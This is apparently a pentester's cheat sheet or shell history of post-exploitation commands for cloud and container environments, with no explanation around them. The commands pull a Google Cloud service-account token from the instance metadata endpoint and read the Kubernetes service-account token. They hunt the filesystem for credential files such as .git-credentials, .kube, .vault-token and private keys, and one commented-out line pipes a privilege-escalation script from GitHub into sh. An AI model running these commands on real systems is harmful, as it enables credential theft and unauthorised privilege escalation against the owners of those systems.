curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
#curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
capsh --print
INT_HIDDEN_FILES=".Xauthority|.bashrc|.bluemix|.boto|.cer|.cloudflared|.credentials.json|.crt|.csr|.db|.der|.docker|.env|.erlang.cookie|.flyrc|.ftpconfig|.git|.git-credentials|.gitconfig|.github|.gnupg|.google_authenticator|.gpg|.htpasswd|.irssi|.jks|.k5login|.kdbx|.key|.keyring|.keystore|.keytab|.kube|.ldaprc|.lesshst|.mozilla|.msmtprc|.ovpn|.p12|.password-store|.pem|.pfx|.pgp|.plan|.profile|.psk|.pub|.pypirc|.rdg|.recently-used.xbel|.rhosts|.roadtools_auth|.secrets.mkey|.service|.socket|.sqlite|.sqlite3|.sudo_as_admin_successful|.svn|.swp|.tf|.tfstate|.timer|.vault-token|.vhd|.vhdx|.viminfo|.vmdk|.vnc|.wgetrc"
find / -type f -iname ".*" ! -path "/sys/*" ! -path "/System/*" ! -path "/private/var/*" -exec ls -l {} \; 2>/dev/null | grep -Ev "$INT_HIDDEN_FILES" | grep -Ev "_history$|\.gitignore|.npmignore|\.listing|\.ignore|\.uuid|\.depend|\.placeholder|\.gitkeep|\.keep|\.keepme|\.travis.yml" | head -n 70
cat /run/secrets/kubernetes.io/serviceaccount/token
kubectl auth can-i --list
